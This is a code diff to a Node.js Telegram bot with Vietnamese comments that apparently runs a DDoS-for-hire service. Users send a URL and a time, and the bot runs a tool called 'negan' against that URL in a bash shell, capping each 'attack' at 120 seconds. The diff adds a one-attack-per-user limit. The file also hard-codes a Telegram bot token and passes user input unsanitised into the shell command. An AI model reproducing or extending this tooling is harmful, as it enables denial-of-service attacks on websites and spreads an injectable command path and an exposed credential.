@@ -5,9 +5,13 @@ const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
 const adminId = 1243471275;
 const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
 const maxTimeAttacks = 120; // Giới hạn thời gian tối đa cho mỗi lệnh
+const maxSlot = 1; // Mỗi người dùng chỉ có thể chạy 1 tiến trình đồng thời
 
 // Khởi tạo bot
 const bot = new TelegramBot(token, { polling: true });
+
+// Biến lưu trữ thông tin người dùng
+const userStatus = new Map(); // Lưu trữ trạng thái người dùng: { chatId: { pid, username, startTime, command } }
 
 // Hàm khởi động bot
 const startBot = () => {
@@ -43,11 +47,17 @@ const executeCommand = async (chatId, command, host, time, username) => {
     ];
     await sendJsonMessage(chatId, startMessage, buttons);
 
+    // Lưu thông tin người dùng
+    userStatus.set(chatId, { pid, username, startTime: Date.now(), command });
+
     const child = exec(command, { shell: '/bin/bash' });
     child.on('close', () => {
         const endTime = getVietnamTime();
         const completeMessage = { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime };
         sendJsonMessage(chatId, completeMessage);
+
+        // Xóa thông tin người dùng khi lệnh hoàn thành
+        userStatus.delete(chatId);
     });
 };
 
@@ -64,6 +74,12 @@ bot.on('message', async (msg) => {
         const [host, time] = text.split(' ');
         if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });
         if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
+
+        // Kiểm tra số lệnh đang chạy của người dùng
+        if (userStatus.has(chatId)) {
+            const remainingTime = maxTimeAttacks - (Date.now() - userStatus.get(chatId).startTime) / 1000;
+            return bot.sendMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.`, { parse_mode: 'HTML' });
+        }
 
         executeCommand(chatId, `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username);
         return;
